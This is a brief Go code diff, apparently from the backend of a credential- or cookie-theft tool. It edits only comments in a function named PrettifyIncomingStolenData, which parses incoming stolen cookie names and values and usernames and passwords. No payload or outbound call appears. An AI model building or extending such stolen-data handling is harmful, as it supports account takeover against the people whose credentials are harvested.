@@ -34,19 +34,19 @@ func PrettifyIncomingStolenData(jsonObject map[string]interface{}, username stri
 			continue
 		}
 
-		// split the substrings by ";"
+		// split the substrings by TERMINATOR
 		substrings := strings.Split(valueStr, TERMINATOR)
 
 		for _, substring := range substrings {
 
 			// trim whitespace to help out with less errors in the below parsing
-			// helps to prevent splitting when we have no more ||| to split on
+			// helps to prevent splitting when we have no more KEY_VAL_DELIM to split on
 			trimmedSubstring := strings.TrimSpace(substring)
 			if trimmedSubstring == "" {
 				continue
 			}
 
-			// now split on ||| to pull out cookie name / username ||| value / password
+			// now split on KEY_VAL_DELIM to pull out cookie name / username KEY_VAL_DELIM value / password
 			parts := strings.Split(substring, KEY_VAL_DELIM)
 
 			// handle errors
